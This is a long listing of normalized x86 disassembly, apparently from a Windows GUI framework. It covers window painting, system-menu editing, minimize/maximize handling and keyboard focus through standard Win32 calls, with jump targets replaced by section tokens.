mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4556b0
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_455798
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d848
xor eax eax
push ebp
push sub_455846
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41dbbc
xor eax eax
push ebp
push sub_455823
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403300
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45582a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41dbbc
retn
sub_455854
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4541d0
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_454204
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403300
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_43fdf0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_454250
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403300
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4558f4
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_440b28
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_440b28
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45577c
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_440b28
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_43ecb8
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_455972
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41d428
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_4559d4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_440b28
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_43ef7c
pop edi
pop esi
retn
sub_455a20
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440b28
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_455b1c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_454544
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_455a20
pop ecx
sub_455b50
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43ba10
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_440b28
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440b28
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_440b28
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43a9e8
pop esi
pop ebx
retn
sub_455be0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_440b28
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43fd7c
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_440b28
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_44e054
sub_455c40
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_43ee18
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_44da68
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_455c8c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_44e2c8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_455cc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_455d5f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455d66
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_44d9c8
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45aa80
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_43745c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45aa80
jmp r-xdata
sub_455d8c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403300
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_455dcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cbc8
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_455df8
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4555b8
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_437234
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_455e50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43fc60
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_459434
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403300
sub_455edc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_440b28
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_440b28
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_440b28
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_455f74
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440b28
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_455554
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403300
sub_455fcc
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44105c
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_455ff8
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4555b8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_456014
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_44d9f8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44d9f8
sub_456054
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_45608c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403ea8
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4560c0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_456211
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456218
lea eax [ ebp - 0x10 ]
call sub_403e54
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_456014
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_4371d8
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412910
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_439e64
lea eax [ ebp - 0x1c ]
call sub_406840
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_456014
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_456054
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_45a724
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_45a78c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_45a78c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45608c
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412910
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_439e64
lea eax [ ebp - 0x1c ]
call sub_406840
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_45a6bc
test [ esi + 0x228 ] 0x8
je r-xdata
sub_456220
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_456294
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4562c0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f0c4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4542d0
lea edx [ ebp - 0x14 ]
call sub_457a98
push ebp
mov eax [ ebp - 0x4 ]
call sub_4542d0
lea edx [ ebp - 0x24 ]
call sub_457a98
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_456294
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4542d0
lea edx [ ebp - 0x24 ]
call sub_457a98
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_456294
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_456294
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_456294
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_456378
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403300
pop esi
pop ebx
retn
sub_45639c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403300
pop esi
pop ebx
retn
sub_4563c0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_43ffa4
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_44105c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_44105c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45645c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4569c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45ab70
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_4569a9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4569b0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
push ebp
push sub_4568b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_456514
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455608
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e080
jmp r-xdata
mov eax [ rw-data ]
call sub_457cf4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_440b28
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_457ce8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440b28
call sub_45126c
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_457d24
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_457cf4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43a5ac
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_457d18
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_457ce8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4548b8
jmp r-xdata
push 0x0
